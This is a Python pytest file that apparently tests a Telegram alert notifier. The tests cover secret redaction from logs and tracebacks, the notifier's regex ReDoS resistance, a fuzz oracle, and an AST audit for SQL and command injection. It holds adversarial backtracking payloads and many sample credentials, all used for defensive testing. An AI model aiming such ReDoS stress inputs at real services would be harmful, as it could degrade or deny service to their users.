            total_cases=168,
            accept_assertions=0,
            unterminated_assertions=0,
            accept_floor=0,
            unterminated_floor=0,
            expected_accept_ratio=0.5,
        )


def test_oracle_rejects_shrunk_corpus():
    """Nebula Cycle 23: Asserts shrunken corpus (<168) fails immediately."""
    with pytest.raises(AssertionError, match="corpus shrank"):
        validate_fuzz_oracle_distribution(
            total_cases=167,
            accept_assertions=100,
            unterminated_assertions=67,
            accept_floor=80,
            unterminated_floor=45,
            expected_accept_ratio=0.6,
        )


def test_oracle_tolerance_boundary_inclusive():
    """Nebula Cycle 23: Asserts exactly at boundary edge passes (<=, not <)."""
    # accept=136, unterminated=64 -> total 200 -> ratio = 136/200 = 0.68
    # expected = 0.68 - 0.08 = 0.60 -> abs(0.68 - 0.60) = 0.08 == tolerance
    r = validate_fuzz_oracle_distribution(
        total_cases=200,
        accept_assertions=136,
        unterminated_assertions=64,
        accept_floor=80,
        unterminated_floor=45,
        expected_accept_ratio=0.60,
        tolerance=0.08,
    )
    assert abs(r - 0.68) < 1e-6


def test_oracle_tolerance_boundary_exclusive_beyond_slack():
    """Nebula Cycle 24: Asserts one tick beyond tolerance margin strictly fails."""
    with pytest.raises(AssertionError, match="drifted"):
        validate_fuzz_oracle_distribution(
            total_cases=200,
            accept_assertions=137,  # 137/200 = 0.685 -> drift = 0.085 > 0.08 + 1e-9
            unterminated_assertions=63,
            accept_floor=80,
            unterminated_floor=45,
            expected_accept_ratio=0.60,
            tolerance=0.08,
        )


def test_oracle_detects_dead_unterminated_branch():
    """Nebula Cycle 23: Accept over-generates, unterminated collapses to floor: must FAIL."""
    with pytest.raises(AssertionError, match="drifted"):
        validate_fuzz_oracle_distribution(
            total_cases=205,
            accept_assertions=160,
            unterminated_assertions=45,
            accept_floor=80,
            unterminated_floor=45,
            expected_accept_ratio=0.64,
            tolerance=0.08,
        )


def test_oracle_allows_symmetric_over_generation():
    """Nebula Cycle 23: Both branches over-generate proportionally: must NOT false-FAIL."""
    r = validate_fuzz_oracle_distribution(
        total_cases=200,
        accept_assertions=128,
        unterminated_assertions=72,
        accept_floor=80,
        unterminated_floor=45,
        expected_accept_ratio=0.64,
        tolerance=0.08,
    )
    assert abs(r - 0.64) <= 0.08


def test_oracle_desync_guard_fires_on_taxonomy_mismatch():
    """Nebula Cycle 24: Asserts taxonomy/corpus desync check catches generator drift."""
    accepted, total = CharClassFuzzTaxonomy.accept_split()
    assert total == 168
    assert accepted == 109
    # Simulated corpus count divergence from taxonomy
    simulated_corpus_count = total + 1
    with pytest.raises(AssertionError, match="taxonomy/corpus desync"):
        assert total == simulated_corpus_count, (
            f"taxonomy/corpus desync: taxonomy={total} corpus={simulated_corpus_count}"
        )


def test_taxonomy_accept_count_matches_live_engine():
    """Nebula Cycle 26/27 (F2 / CWE-758): Asserts live re engine accept count matches certified baseline under running CPython."""
    baseline = CharClassFuzzTaxonomy.certified_accept_count()
    live_accepted, _ = CharClassFuzzTaxonomy.live_accept_split()
    if baseline is None:
        msg = (
            f"no certified accept-count baseline for CPython "
            f"{sys.version_info.major}.{sys.version_info.minor}; "
            f"observed live accept-count={live_accepted}. "
            "Recertify BASELINE_ACCEPTED_COUNT_BY_PY before trusting oracle."
        )
        if os.environ.get("HERMES_ALLOW_UNCERTIFIED_INTERPRETER") == "1":
            pytest.skip(msg)
        pytest.fail(msg)
    assert live_accepted == baseline, (
        f"re-engine accept-count drift under {sys.version.split()[0]}: "
        f"live={live_accepted} baseline={baseline}"
    )


def test_taxonomy_structural_fingerprint_is_stable():
    """Nebula Cycle 26/27 (R1 / CWE-693): Asserts combinatorial taxonomy SHA256 structural fingerprint is stable."""
    actual = CharClassFuzzTaxonomy.structural_fingerprint()
    expected = CharClassFuzzTaxonomy.BASELINE_FINGERPRINT
    assert actual == expected, (
        f"CharClassFuzzTaxonomy structural fingerprint mutated!\n"
        f"  Expected: {expected}\n"
        f"  Actual:   {actual}\n"
        "If intentional, update BASELINE_FINGERPRINT and recertify accept counts."
    )


def test_count_preserving_mutation_is_caught_by_fingerprint():
    """Nebula Cycle 26/27 (R1 / CWE-693 / F3): Asserts count-preserving mutation is caught by structural fingerprint."""
    class SwappedTaxonomy(CharClassFuzzTaxonomy):
        bodies = CharClassFuzzTaxonomy.bodies[:-1] + ("z",)

    assert SwappedTaxonomy.total_cases() == CharClassFuzzTaxonomy.total_cases()
    swap_accepted, _ = SwappedTaxonomy.live_accept_split()
    baseline = CharClassFuzzTaxonomy.certified_accept_count()
    assert swap_accepted == (baseline or CharClassFuzzTaxonomy.BASELINE_ACCEPTED_COUNT)
    assert (
        SwappedTaxonomy.structural_fingerprint()
        != CharClassFuzzTaxonomy.BASELINE_FINGERPRINT
    )


def test_scalar_baseline_matches_per_version_table():
    """Nebula Cycle 27 (F3 / CWE-671): Cross-guard invariant ensuring scalar baseline equals per-version map."""
    assert len(CharClassFuzzTaxonomy.BASELINE_ACCEPTED_COUNT_BY_PY) > 0
    for ver, count in CharClassFuzzTaxonomy.BASELINE_ACCEPTED_COUNT_BY_PY.items():
        assert count == CharClassFuzzTaxonomy.BASELINE_ACCEPTED_COUNT == 109, (
            f"Version table mismatch for {ver}: count={count} vs "
            f"scalar={CharClassFuzzTaxonomy.BASELINE_ACCEPTED_COUNT}"
        )


def test_baseline_fingerprint_and_count_are_mutually_consistent():
    """Nebula Cycle 27 (F3 / CWE-671): Mutual consistency across structural fingerprint, case counts, and versioned baseline."""
    live_accepted, total_generated = CharClassFuzzTaxonomy.live_accept_split()
    assert total_generated == CharClassFuzzTaxonomy.total_cases() == 168
    assert (
        CharClassFuzzTaxonomy.structural_fingerprint()
        == CharClassFuzzTaxonomy.BASELINE_FINGERPRINT
    )
    assert (
        CharClassFuzzTaxonomy.certified_accept_count()
        == CharClassFuzzTaxonomy.BASELINE_ACCEPTED_COUNT
    )
    assert live_accepted == CharClassFuzzTaxonomy.BASELINE_ACCEPTED_COUNT


def test_taxonomy_cardinality_is_product_of_axes():
    """Nebula Cycle 25: Asserts taxonomy cardinality is strictly the Cartesian product of its axes."""
    assert (
        CharClassFuzzTaxonomy.total_cases()
        == len(CharClassFuzzTaxonomy.prefixes)
        * len(CharClassFuzzTaxonomy.bodies)
        * len(CharClassFuzzTaxonomy.suffixes)
        == 168
    )


def test_taxonomy_mutation_detects_drift():
    r"""Nebula Cycle 25: Simulates mutated taxonomy with r'\s' body and verifies drift guard detects departure."""
    class MutatedTaxonomy(CharClassFuzzTaxonomy):
        bodies = CharClassFuzzTaxonomy.bodies + (r"\s",)

    mutated_total = MutatedTaxonomy.total_cases()
    mutated_accepted, mutated_gen_total = MutatedTaxonomy.live_accept_split()

    assert (
        mutated_total != 168
        or mutated_accepted != CharClassFuzzTaxonomy.BASELINE_ACCEPTED_COUNT
    ), "drift guard failed to detect taxonomy mutation"
    assert mutated_total != CharClassFuzzTaxonomy.total_cases()
    assert mutated_accepted != CharClassFuzzTaxonomy.BASELINE_ACCEPTED_COUNT
    # Assert drift guard assertion raises AssertionError when evaluated against mutated taxonomy
    with pytest.raises(AssertionError, match="re-engine accept-count drift"):
        assert mutated_accepted == CharClassFuzzTaxonomy.BASELINE_ACCEPTED_COUNT, (
            f"re-engine accept-count drift under {sys.version.split()[0]}: "
            f"live={mutated_accepted} baseline={CharClassFuzzTaxonomy.BASELINE_ACCEPTED_COUNT}"
        )


def test_taxonomy_delimiter_edge_cases_differential_agreement():
    """Nebula Cycle 25: Asserts differential agreement between _scan_char_class and re.compile on delimiter edge cases."""
    edge_cases = ["[]", "[^]", "[]]", "[^]]", r"[\]]", r"[\\\]]", r"[a\]b]"]
    for pattern in edge_cases:
        try:
            re.compile(pattern)
            re_accepts = True
        except re.error:
            re_accepts = False
        _, closed = _scan_char_class(pattern, 0)
        assert closed == re_accepts, (
            f"Differential agreement failed for edge case {pattern!r}: "
            f"scanner_closed={closed} re_accepts={re_accepts}"
        )


def test_zero_unanalyzable_patterns_in_production_notifier():
    """Nebula Cycle 17 CI Gate: Enforce that zero production regex patterns produce UNANALYZABLE issues."""
    all_patterns = [
        *HermesTelegramNotifier._SECRET_PATTERNS,
        HermesTelegramNotifier._URL_CRED_PATTERN,
        HermesTelegramNotifier._BOT_URL_PATTERN,
        HermesTelegramNotifier._QUERY_PARAM_PATTERN,
        HermesTelegramNotifier._BASIC_AUTH_PATTERN,
        HermesTelegramNotifier._KV_SECRET_PATTERN,
        HermesTelegramNotifier._PEM_KEY_PATTERN,
    ]
    for pat in all_patterns:
        issues = analyze_redos_vulnerabilities(pat.pattern)
        unanalyzable_issues = [i for i in issues if "UNANALYZABLE" in i]
        assert not unanalyzable_issues, (
            f"Production pattern '{pat.pattern}' yielded UNANALYZABLE issues: {unanalyzable_issues}"
        )
        assert not issues, f"Production pattern '{pat.pattern}' failed static analysis: {issues}"


def test_constant_factor_blowup_is_bounded(tmp_path):
    """Nebula Cycle 14: Feeds 64KB payload to redact_secrets, asserting execution time < 250ms."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    payload = "A" * 65536
    start = time.perf_counter()
    out = notifier.redact_secrets(payload)
    elapsed = time.perf_counter() - start

    assert elapsed < 0.250, f"Redaction of 64KB payload took {elapsed*1000:.2f}ms; expected < 250ms"
    assert isinstance(out, str)


def test_adversarial_backtracking_payload(tmp_path):
    """Nebula Cycle 14: Feeds evil near-match string without terminating boundary to redact_secrets, asserting < 250ms."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    evil_payload = "ya29." + "a" * 10000
    start = time.perf_counter()
    out = notifier.redact_secrets(evil_payload)
    elapsed = time.perf_counter() - start

    assert elapsed < 0.250, f"Adversarial backtracking near-match took {elapsed*1000:.2f}ms; expected < 250ms"
    assert isinstance(out, str)


def test_redos_timing_bound(tmp_path):
    """CWE-1333: redact_secrets completes within reasonable latency and scales sub-quadratically on repeating stress inputs."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    def measure_median(func, payload: str, runs: int = 5) -> float:
        times = []
        for _ in range(runs):
            s = time.perf_counter()
            func(payload)
            times.append(time.perf_counter() - s)
        return statistics.median(times)

    # 4KB string consisting of repeated /+=
    stress_payload = ("/+=" * 1500)[:4096]
    median_inst = measure_median(notifier.redact_secrets, stress_payload, runs=5)
    assert median_inst < 0.250, f"Instance redaction median took {median_inst*1000:.2f}ms; expected < 250ms"

    # Classmethod invocation verification
    median_cls = measure_median(HermesTelegramNotifier.redact_secrets, stress_payload, runs=5)
    assert median_cls < 0.250, f"Classmethod redaction median took {median_cls*1000:.2f}ms; expected < 250ms"

    # Nebula F1: Linear scaling verification (4x input length must scale sub-quadratically)
    def measure(n):
        return measure_median(notifier.redact_secrets, ("/+=" * n)[:n], runs=5)

    small_t = measure(2048)
    large_t = measure(8192)
    # 4x input length must scale sub-quadratically (not blow up > 6x or > 150ms)
    assert large_t < max(small_t * 6, 0.150), f"4x input grew {large_t/small_t:.1f}x; expected near-linear"

    # Nebula F1: Verify pattern quantifiers in all credential patterns via static ReDoS analyzer
    all_patterns = [
        *HermesTelegramNotifier._SECRET_PATTERNS,
        HermesTelegramNotifier._URL_CRED_PATTERN,
        HermesTelegramNotifier._QUERY_PARAM_PATTERN,
        HermesTelegramNotifier._BASIC_AUTH_PATTERN,
        HermesTelegramNotifier._KV_SECRET_PATTERN,
        HermesTelegramNotifier._PEM_KEY_PATTERN,
    ]
    for pat in all_patterns:
        issues = analyze_redos_vulnerabilities(pat.pattern)
        assert not issues, f"Pattern '{pat.pattern}' flagged for ReDoS: {issues}"


def test_analyzer_terminates_on_adversarial_length():
    """Nebula Cycle 27 (CWE-1333): Asserts analyze_redos_vulnerabilities terminates linearly on adversarial lengths."""
    payload = "A" * 10000
    start = time.perf_counter()
    issues = analyze_redos_vulnerabilities(payload)
    elapsed = time.perf_counter() - start

    assert elapsed < 0.250, (
        f"analyze_redos_vulnerabilities took {elapsed*1000:.2f}ms on 10,000-char input; expected < 250ms"
    )
    assert isinstance(issues, list)


@pytest.mark.parametrize("limit", [100, 120])
def test_truncation_boundary_secret_never_leaks_fragment(tmp_path, limit):
    """CWE-532 / CWE-116: Secrets whose tail straddles the truncation boundary never leak fragments >= 6 characters."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    secret_raw = "SUPER_SECRET_PAYLOAD_TOKEN_9876543210"
    # Place secret so its first 10 characters are before limit, and tail crosses limit
    prefix = "A" * (limit - 10)
    full_text = prefix + secret_raw

    out = notifier.sanitize_error(full_text, limit=limit, known_secrets={secret_raw})

    # Nebula F2: Verify [REDACTED] is present in output, confirming redaction occurred before truncation
    assert "[REDACTED]" in out

    # Nebula F2: Verify no fragment >= 6 characters of secret_raw appears in the output
    for i in range(len(secret_raw) - 5):
        frag = secret_raw[i : i + 6]
        assert frag not in out, f"Leaked {len(frag)}-char fragment '{frag}' at offset {i} in '{out}'"

    # Also test with a pattern-matched secret (e.g. Bearer token) straddling the boundary
    bearer_secret = "Bearer " + ("Z" * 50)
    full_bearer_text = ("X" * (limit - 16)) + " " + bearer_secret
    out_bearer = notifier.sanitize_error(full_bearer_text, limit=limit)
    assert "[REDACTED]" in out_bearer
    for i in range(len(bearer_secret) - 5):
        frag = bearer_secret[i : i + 6]
        assert frag not in out_bearer, f"Leaked bearer fragment '{frag}' in '{out_bearer}'"


def test_escape_redact_ordering_with_html_special_chars(tmp_path):
    """CWE-116 / CWE-532: Passwords with HTML special characters inside DB URLs are redacted before escaping."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    raw_password = "p&ss<w>ord"
    db_url = f"postgresql://user:{raw_password}@db:5432/main"

    out_sanitized = notifier.sanitize_error(db_url, limit=120)
    out_redacted = notifier.redact_secrets(db_url)

    # Verify neither raw password nor escaped p&amp;ss&lt;w&gt;ord appears in sanitized output
    assert raw_password not in out_sanitized
    assert "p&amp;ss&lt;w&gt;ord" not in out_sanitized
    assert html.escape(raw_password, quote=True) not in out_sanitized
    assert "[REDACTED]" in out_sanitized
    assert "postgresql://user:[REDACTED]@db:5432/main" in out_sanitized

    assert raw_password not in out_redacted
    assert "postgresql://user:[REDACTED]@db:5432/main" in out_redacted

    # Verify through format_urgent_alert
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "db-job",
                    "consecutive_failures": 3,
                    "last_error": f"Failed: {db_url}",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    alert_out = notifier.format_urgent_alert(scan)
    assert raw_password not in alert_out
    assert "p&amp;ss&lt;w&gt;ord" not in alert_out
    assert "[REDACTED]" in alert_out


def test_known_env_value_exact_verbatim_redacted(tmp_path):
    """Defense B1: Known secrets loaded from .env are scrubbed verbatim even when unformatted."""
    unique_secret = "TEST_SOVEREIGN_KEY_9876543210"
    env_file = tmp_path / ".env"
    env_file.write_text(f"TELEGRAM_BOT_TOKEN=test-token-123\nAPP_API_KEY={unique_secret}\n")

    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)
    assert unique_secret in notifier._known_secrets

    # Put it completely unformatted into last_error (no prefix, no URL, no password=)
    raw_error = f"Fatal system crash while processing payload: {unique_secret} at node 4"
    scan = {
        "overall_health_score": 10,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "sovereign-job",
                    "consecutive_failures": 3,
                    "last_error": raw_error,
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)

    assert unique_secret not in out
    assert "[REDACTED]" in out

    sanitized = notifier.sanitize_error(raw_error)
    assert unique_secret not in sanitized
    assert "[REDACTED]" in sanitized

    redacted = notifier.redact_secrets(raw_error)
    assert unique_secret not in redacted
    assert "[REDACTED]" in redacted


def test_uppercase_jdbc_query_param_basic_auth_redacted(tmp_path):
    """Defense A3: Uppercase JDBC schemes, query parameter credentials, and Basic Authorization are redacted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    # 1. Uppercase JDBC URL
    jdbc_url = "JDBC:POSTGRESQL://admin:MyPass123@localhost:5432/db"
    out_jdbc = notifier.redact_secrets(jdbc_url)
    assert "MyPass123" not in out_jdbc
    assert "JDBC:POSTGRESQL://admin:[REDACTED]@localhost:5432/db" in out_jdbc

    # 2. Query Parameter Credentials
    query_url = "https://api.example.com/data?token=SuperSecretQueryParamToken12345"
    out_query = notifier.redact_secrets(query_url)
    assert "SuperSecretQueryParamToken12345" not in out_query
    assert "https://api.example.com/data?token=[REDACTED]" in out_query

    # Query Parameter in middle of URL with other params
    multi_param_url = "https://api.example.com/v1?page=1&api_key=UltraSecretKey9988&format=json"
    out_multi = notifier.redact_secrets(multi_param_url)
    assert "UltraSecretKey9988" not in out_multi
    assert "https://api.example.com/v1?page=1&api_key=[REDACTED]&format=json" in out_multi

    # 3. Basic Authorization Header
    basic_auth = "Authorization: Basic dXNlcjpwYXNzd29yZDEyMw=="
    out_auth = notifier.redact_secrets(basic_auth)
    assert "dXNlcjpwYXNzd29yZDEyMw==" not in out_auth
    assert "Authorization: Basic [REDACTED]" in out_auth


def test_false_positive_guard_for_clean_identifiers(tmp_path):
    """Defense B3 / F1: Verify legitimate 12-digit numbers, order IDs, chat IDs, and epochs are NOT corrupted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    chat_id = TEST_CHAT_ID
    secondary_chat_id = "9876543210"
    order_id = "987654321012"
    epoch_ts = "1728848000"
    job_uuid = "46a4a24c-0878-434e-989d-35d64421bbca"

    clean_message = (
        f"Order {order_id} sent to chat {chat_id} (secondary: {secondary_chat_id}) at epoch {epoch_ts} for job {job_uuid}"
    )

    out = notifier.redact_secrets(clean_message)
    assert out == clean_message
    assert "[REDACTED]" not in out

    sanitized = notifier.sanitize_error(clean_message, limit=200)
    assert order_id in sanitized
    assert chat_id in sanitized
    assert secondary_chat_id in sanitized
    assert epoch_ts in sanitized
    assert job_uuid in sanitized
    assert "[REDACTED]" not in sanitized


def test_multi_secret_per_line_all_redacted(tmp_path):
    """CWE-532 / Nebula F4: Multiple credentials on a single line are all redacted simultaneously."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    raw_text = (
        'postgresql://user:pass123@host:5432/db with token ya29.A0ARrdaM-12345 and password="fooBarPassword"'
    )
    redacted = notifier.redact_secrets(raw_text)

    assert "pass123" not in redacted
    assert "A0ARrdaM" not in redacted
    assert "fooBarPassword" not in redacted
    assert "postgresql://user:[REDACTED]@host:5432/db" in redacted
    assert "token [REDACTED]" in redacted
    assert "password=[REDACTED]" in redacted

    sanitized = notifier.sanitize_error(raw_text, limit=300)
    assert "pass123" not in sanitized
    assert "A0ARrdaM" not in sanitized
    assert "fooBarPassword" not in sanitized
    assert "[REDACTED]" in sanitized


def test_secret_split_across_traceback_newlines(tmp_path):
    """CWE-532 / Nebula F4: Multi-line traceback with distinct credentials across newlines are all redacted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    traceback_str = (
        "Traceback (most recent call last):\n"
        '  File "db.py", line 12, in connect\n'
        '    engine = create_engine("mysql://root:secretPass99@db.prod.internal:3306/main")\n'
        '  File "auth.py", line 45, in request_token\n'
        '    headers = {"X-Api-Key": "AIzaSyD-1234567890abcdefghijklmnopqrstu"}\n'
        '  File "google_auth.py", line 88, in refresh\n'
        '    refresh_token = "1//04testRefreshToken9876543210-abcdef"\n'
        "RuntimeError: Authentication failed"
    )

    redacted = notifier.redact_secrets(traceback_str)
    assert "secretPass99" not in redacted
    assert "AIzaSyD-1234567890abcdefghijklmnopqrstu" not in redacted
    assert "1//04testRefreshToken9876543210-abcdef" not in redacted
    assert "mysql://root:[REDACTED]@db.prod.internal:3306/main" in redacted

    sanitized = notifier.sanitize_error(traceback_str, limit=500)
    assert "secretPass99" not in sanitized
    assert "AIzaSyD-1234567890abcdefghijklmnopqrstu" not in sanitized
    assert "1//04testRefreshToken9876543210-abcdef" not in sanitized
    assert "[REDACTED]" in sanitized


def test_percent_encoded_and_unicode_passwords_in_url(tmp_path):
    """CWE-532 / CWE-259 / Nebula F4: URLs containing percent-encoded and unicode passwords are fully redacted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    # 1. Percent-encoded password containing %26 (&) and %40 (@)
    percent_url = "postgresql://user:p%26ss%40word123@host:5432/db"
    redacted_percent = notifier.redact_secrets(percent_url)
    assert "p%26ss%40word123" not in redacted_percent
    assert "postgresql://user:[REDACTED]@host:5432/db" in redacted_percent

    sanitized_percent = notifier.sanitize_error(percent_url, limit=120)
    assert "p%26ss%40word123" not in sanitized_percent
    assert "[REDACTED]" in sanitized_percent

    # 2. Unicode characters in password
    unicode_url = "mysql://admin:pàsswórd123@host:3306/db"
    redacted_unicode = notifier.redact_secrets(unicode_url)
    assert "pàsswórd123" not in redacted_unicode
    assert "mysql://admin:[REDACTED]@host:3306/db" in redacted_unicode

    sanitized_unicode = notifier.sanitize_error(unicode_url, limit=120)
    assert "pàsswórd123" not in sanitized_unicode
    assert "[REDACTED]" in sanitized_unicode


def test_empty_or_none_known_secrets_fallback_to_regex(tmp_path):
    """CWE-532 / Nebula F4: Empty or None known_secrets cleanly falls back to regex redaction."""
    # 1. Explicit instantiation with empty _known_secrets
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent"), target_chat_id="123")
    notifier._known_secrets = set()

    err_text = (
        "Error: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123 "
        "and password=superSecretPass "
        "and postgresql://app:dbSecret123@localhost:5432/app"
    )

    out_inst = notifier.sanitize_error(err_text, limit=300)
    assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123" not in out_inst
    assert "superSecretPass" not in out_inst
    assert "dbSecret123" not in out_inst
    assert "[REDACTED]" in out_inst

    # 2. Classmethod with known_secrets=None
    out_cls_none = HermesTelegramNotifier.sanitize_error(err_text, limit=300, known_secrets=None)
    assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123" not in out_cls_none
    assert "superSecretPass" not in out_cls_none
    assert "dbSecret123" not in out_cls_none
    assert "[REDACTED]" in out_cls_none

    # 3. Classmethod with known_secrets=set()
    out_cls_empty = HermesTelegramNotifier.sanitize_error(err_text, limit=300, known_secrets=set())
    assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123" not in out_cls_empty
    assert "superSecretPass" not in out_cls_empty
    assert "dbSecret123" not in out_cls_empty
    assert "[REDACTED]" in out_cls_empty

    # 4. Direct redact_secrets with known_secrets=None
    redacted = HermesTelegramNotifier.redact_secrets(err_text, known_secrets=None)
    assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token123" not in redacted
    assert "superSecretPass" not in redacted
    assert "dbSecret123" not in redacted
    assert "[REDACTED]" in redacted


def test_scanner_and_sanitizer_resilience_on_corrupted_payloads(tmp_path):
    """Nebula Cycle 26/27 (R3 / CWE-20 & Stealth Network Invariant): Asserts scanner and sanitizers safely handle malformed/corrupted inputs."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    corrupted_payloads = [
        "foo\x00\x00\x00bar",
        r"[\\",
        "[",
        "[^",
        r"[a\\",
        "legit\udce2record",
        "A" * 10000,
        "",
    ]

    with patch("urllib.request.urlopen") as mock_urlopen:
        for payload in corrupted_payloads:
            # 1. _scan_char_class completes without crash and returns valid (int, bool)
            next_idx, closed = _scan_char_class(payload, 0)
            assert isinstance(next_idx, int), f"_scan_char_class returned non-int index for {payload!r}"
            assert isinstance(closed, bool), f"_scan_char_class returned non-bool closed for {payload!r}"
            assert 0 <= next_idx <= len(payload), f"Index out of bounds for {payload!r}: {next_idx}"

            # Surrogatepass encoding safety
            surrogate_encoded = payload.encode("utf-8", errors="surrogatepass")
            assert isinstance(surrogate_encoded, bytes)

            # 2. analyze_redos_vulnerabilities completes without crash and returns list
            issues = analyze_redos_vulnerabilities(payload)
            assert isinstance(issues, list), f"analyze_redos_vulnerabilities returned non-list for {payload!r}"

            # 3. HermesTelegramNotifier.redact_secrets and sanitize_error handle all payloads without crashing
            redacted = notifier.redact_secrets(payload)
            assert isinstance(redacted, str), f"redact_secrets returned non-str for {payload!r}"
            sanitized = notifier.sanitize_error(payload)
            assert isinstance(sanitized, str), f"sanitize_error returned non-str for {payload!r}"

            # Tainted input redaction verification
            tainted = f"{payload} TELEGRAM_BOT_TOKEN=test-token-123"
            redacted_tainted = notifier.redact_secrets(tainted)
            assert "test-token-123" not in redacted_tainted

            # Also verify classmethods directly
            redacted_cls = HermesTelegramNotifier.redact_secrets(payload)
            assert isinstance(redacted_cls, str)
            sanitized_cls = HermesTelegramNotifier.sanitize_error(payload)
            assert isinstance(sanitized_cls, str)

        # Stealth invariant: verify notifier makes zero outbound network calls
        mock_urlopen.assert_not_called()


def test_production_monitor_ast_sql_and_subprocess_safety():
    """Nebula Cycle 26 (R5 / CWE-89 & CWE-78): Static AST verification for SQL injection and command injection safety."""
    repo_root = Path(__file__).resolve().parent.parent
    monitor_path = repo_root / "tools" / "hourly_digest_monitor.py"
    assert monitor_path.is_file(), f"Target source file not found: {monitor_path}"

    tree = ast.parse(monitor_path.read_text(encoding="utf-8"), filename=str(monitor_path))

    execute_calls_inspected = 0
    subprocess_calls_inspected = 0

    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue

        # 1. SQL Injection audit: .execute(...) calls
        if isinstance(node.func, ast.Attribute) and node.func.attr == "execute":
            execute_calls_inspected += 1
            assert node.args, f"Line {node.lineno}: .execute() called without arguments"
            query_arg = node.args[0]
            # Must be an ast.Constant string literal (no f-strings, no % formatting, no .format() calls)
            assert isinstance(query_arg, ast.Constant) and isinstance(query_arg.value, str), (
                f"Line {node.lineno}: .execute() query must be an ast.Constant string literal, "
                f"got {type(query_arg).__name__} (CWE-89 SQL injection risk)"
            )
            assert not isinstance(query_arg, ast.JoinedStr), (
                f"Line {node.lineno}: f-string in SQL query (CWE-89)"
            )
            assert not (
                isinstance(query_arg, ast.BinOp) and isinstance(query_arg.op, ast.Mod)
            ), f"Line {node.lineno}: % operator formatting in SQL query (CWE-89)"

        # 2. Command Injection audit: subprocess.run(...) / subprocess.Popen(...)
        is_subprocess_call = False
        if isinstance(node.func, ast.Attribute) and node.func.attr in ("run", "Popen"):
            if isinstance(node.func.value, ast.Name) and node.func.value.id == "subprocess":
                is_subprocess_call = True
        elif isinstance(node.func, ast.Name) and node.func.id in ("run", "Popen"):
            is_subprocess_call = True

        if is_subprocess_call:
            subprocess_calls_inspected += 1
            # shell=True keyword argument must NEVER be present
            for kw in node.keywords:
                if kw.arg == "shell":
                    if isinstance(kw.value, ast.Constant):
                        assert kw.value.value is False, (
                            f"Line {node.lineno}: subprocess call explicitly enables shell={kw.value.value} (CWE-78)"
                        )
                    else:
                        pytest.fail(f"Line {node.lineno}: non-constant shell argument passed to subprocess (CWE-78)")

            # Command argument must be an ast.List or ast.Name (structured argv array)
            assert node.args, f"Line {node.lineno}: subprocess called without command argument"
            cmd_arg = node.args[0]
            assert isinstance(cmd_arg, (ast.List, ast.Name)), (
                f"Line {node.lineno}: subprocess command argument must be an ast.List or ast.Name, "
                f"got {type(cmd_arg).__name__} (CWE-78 command injection risk)"
            )

    # Sanity checks: ensure we actually inspected calls and didn't trivially pass
    assert execute_calls_inspected > 0, "Zero .execute() calls found; AST walk failed or file mutated"
    assert subprocess_calls_inspected > 0, "Zero subprocess calls found; AST walk failed or file mutated"


# ==============================================================================
# Nebula Cycle 34 Adversarial Security Suite (CWE-400, CWE-918, CWE-116, Zero-Div)
# ==============================================================================

def test_safe_pct_division_and_bounds():
    """Verify _safe_pct never raises ZeroDivisionError and safely bounds NaN, Inf, and negatives."""
    assert _safe_pct(50, 100) == 50.0
    assert _safe_pct(1, 3, digits=2) == 33.33
    # Division by zero
    assert _safe_pct(50, 0) == 0.0
    assert _safe_pct(0, 0) == 0.0
    # Negative whole or part
    assert _safe_pct(-5, 100) == 0.0
    assert _safe_pct(50, -100) == 0.0
    # Non-finite inputs
    assert _safe_pct(float("nan"), 100) == 0.0
    assert _safe_pct(50, float("nan")) == 0.0
    assert _safe_pct(float("inf"), 100) == 0.0
